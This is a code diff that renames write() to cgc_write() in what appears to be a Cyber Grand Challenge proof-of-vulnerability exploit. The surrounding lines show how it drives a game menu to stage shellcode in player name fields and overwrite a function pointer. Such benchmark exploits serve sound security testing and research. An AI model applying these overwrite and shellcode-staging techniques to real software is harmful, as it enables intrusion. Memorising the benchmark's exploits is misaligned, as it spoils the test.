@@ -28,7 +28,7 @@ THE SOFTWARE.
 #include <libcgc.h>
 
 
-int write( int fd, void *buffer, size_t count )
+int cgc_write( int fd, void *buffer, size_t count )
 {
 	size_t written;
     int total_written;
@@ -153,16 +153,16 @@ int value;
 	regnum = 1;
 
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
-	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
+	if (cgc_write(3, &ip_mask, sizeof(ip_mask)) == -1)
 		_terminate(-1);
 
-	if (write(3, &regmask, sizeof(regmask)) == -1)
+	if (cgc_write(3, &regmask, sizeof(regmask)) == -1)
 		_terminate(-1);
 
-	if (write(3, &regnum, sizeof(regnum)) == -1)
+	if (cgc_write(3, &regnum, sizeof(regnum)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
@@ -175,21 +175,21 @@ int value;
 	eat_lines(6);
 
 	// now add a new player
-	write(1, "1\n", 2);
+	cgc_write(1, "1\n", 2);
 
 	eat_lines(1);
 	// name doesn't matter because its going to be overwritten anyway
-	write(1, "a\n", 2);
+	cgc_write(1, "a\n", 2);
 
 	eat_lines(1);
 
 	// definitely need it to be a computer player so that the overwritten function pointer gets called
-	write(1, "y\n", 2);
+	cgc_write(1, "y\n", 2);
 
 	eat_lines(1);
 
 	// doesn't matter which method
-	write(1, "1\n", 2);
+	cgc_write(1, "1\n", 2);
 
 	// back to the menu
 	eat_lines(6);
@@ -199,7 +199,7 @@ int value;
 		exploit_buffer[i] = 0;
 
 	// now add a second player to hold the stage two of the shellcode in its player name field
-	write(1, "1\n", 2);
+	cgc_write(1, "1\n", 2);
 
 	eat_lines(1);
 
@@ -235,13 +235,13 @@ int value;
 
 	exploit_buffer[8] = 0x0a;
 
-	write(1, exploit_buffer, 9);
+	cgc_write(1, exploit_buffer, 9);
 
-	write(1, "y\n1\n", 4);
+	cgc_write(1, "y\n1\n", 4);
 
 
 // now add a third player for the final stage of the shellcode
-	write(1, "1\n", 2);
+	cgc_write(1, "1\n", 2);
 
 	// subtract the mask that was added to the EIP to make it null safe, etc
 	exploit_buffer[0] = 0x2d;
@@ -256,13 +256,13 @@ int value;
 
 	exploit_buffer[7] = 0x0a;
 
-	write(1, exploit_buffer, 8);
+	cgc_write(1, exploit_buffer, 8);
 
 	eat_lines(1);
-	write(1,"y\n",2);
+	cgc_write(1,"y\n",2);
 
 	eat_lines(1);
-	write(1,"1\n",2);
+	cgc_write(1,"1\n",2);
 
 	eat_lines(6);
 
@@ -309,11 +309,11 @@ int value;
 	*(unsigned int *)(exploit_buffer+16) = 0xbaaaae6c;
 
 	// now do the overwrite
-	write(1, exploit_buffer, 20);
-	write(1, "\n", 1);
+	cgc_write(1, exploit_buffer, 20);
+	cgc_write(1, "\n", 1);
 
 	// now "play" a round to cause the function pointer to be dereferenced
-	write(1, "3\n", 2);
+	cgc_write(1, "3\n", 2);
 
 }
 
